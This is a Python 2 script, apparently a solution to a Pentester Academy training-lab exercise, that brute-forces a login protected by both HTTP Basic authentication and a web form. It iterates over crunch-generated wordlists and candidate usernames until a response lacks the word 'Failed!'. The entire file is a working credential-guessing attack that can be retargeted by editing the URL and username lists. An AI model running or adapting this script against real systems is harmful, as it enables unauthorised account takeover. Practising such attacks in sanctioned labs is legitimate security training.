#!/usr/bin/python

import base64
import urllib
import urllib2
import sys
from termcolor import colored


FU = ["admin@pentesteracademy.com","nick@pentesteracademy.com"] #Forum User Names
BU = ["admin","nick"] #Basic Authentication User Names

'''
Use The Following Command To Generate wordlist
#crunch 5 5 mno -o Form_wordlist.txt
#crunch 5 5 eiv -o Basic_wordlist.txt
'''

Fp = open('Form_wordlist.txt','r')
FP = [x.strip() for x in Fp.readlines()]
Fp.close()

Bp = open('Basic_wordlist.txt','r')
BP = [x.strip() for x in Bp.readlines()]
Bp.close()

url = "http://pentesteracademylab.appspot.com/lab/webapp/auth/form/1"
for BasicUserName in BU:
	for BasicPass in BP:
		Form_Login_Data = "" 
		Login_Auth = urllib2.Request(url,Form_Login_Data) #urllib by default use GET request if you need to make it POST you will need to add data
		Login_base = base64.encodestring('%s:%s' %(BasicUserName,BasicPass)).replace('\n','')
		Login_Auth.add_header("Authorization" , "Basic %s" %Login_base)
		try:
			BLogin = urllib2.urlopen(Login_Auth)
		except Exception,code:
			print "Login Basic Authentication with Username %s ... Password %s ... Failed!"%(BasicUserName,BasicPass)
		else:
			print colored("Login Basic Authentication with Username %s ... Password %s "%(BasicUserName,BasicPass),"green")
			for FormUserName in FU:
				for FormPass in FP:
					Form_Login_Data = urllib.urlencode({'email':'%s' %FormUserName , 'password' : '%s' %FormPass})
					Login_Auth = urllib2.Request(url,Form_Login_Data) #urllib by default use GET request if you need to make it POST you will need to add data
					Login_base = base64.encodestring('%s:%s' %(BasicUserName,BasicPass)).replace('\n','')
					Login_Auth.add_header("Authorization" , "Basic %s" %Login_base)
					FLogin = urllib2.urlopen(Login_Auth)
					if FLogin.read().find("Failed!") == -1:
						print colored("Login Form with Basic Authentication %s:%s and Username %s ... Password %s ... "%(BasicUserName,BasicPass,FormUserName,FormPass),"green")
						sys.exit(0)
					else:
						print "Login Form with Basic Authentication %s:%s and Username %s ... Password %s ... Failed!"%(BasicUserName,BasicPass,FormUserName,FormPass)
